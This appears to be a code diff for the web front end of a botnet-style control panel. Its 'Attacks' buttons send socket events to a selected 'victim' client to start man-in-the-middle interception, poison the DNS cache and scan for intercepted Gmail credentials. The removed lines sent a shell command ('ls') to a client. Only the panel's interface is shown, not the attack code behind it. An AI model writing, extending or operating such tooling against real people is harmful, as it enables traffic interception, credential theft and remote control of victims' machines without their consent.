@@ -58,6 +58,27 @@
           
       });
 
+      $("#checkpass").on('click', function() { 
+            $.get("filter.php", function(data, status){
+                alert(data);
+            });
+          
+      });
+
+      $("#mitmdo").on('click', function() { 
+            socket.emit('mitmproxy_client', { toclient: $("#victim").val() }, function (data) {
+                console.log(data);
+                alert("All Data is not being itercepted!");
+            });
+          
+      });
+
+      $("#poisondns").on('click', function() { 
+            socket.emit('dnspoison_client', { toclient: $("#victim").val() }, function (data) {
+                console.log(data);
+                alert("DNS Poisoned!");
+            });
+      });
       
    });    
       
@@ -82,17 +103,9 @@
 
             $("#cselect").append(genUserSelect(data));
 
-            socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
-                console.log(data) 
-            });
+           
 
-            socket.emit('dnspoison_client', { toclient: 0 }, function (data) {
-                console.log(data) 
-            });
-
-            socket.emit('mitmproxy_client', { toclient: 0 }, function (data) {
-                console.log(data) 
-            });
+            
 
 
             
@@ -145,6 +158,7 @@
       <h3>Attacks</h3>
     <div class="col-sm-12" id="operations">
         <button id="mitmdo">Man In the Middle Attack</button><br/><br/>  
+        <button id="mitmdo">MITM - Scan for intercepted Gmail Cred.</button><br/><br/>  
         <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
     </div>
   </div>
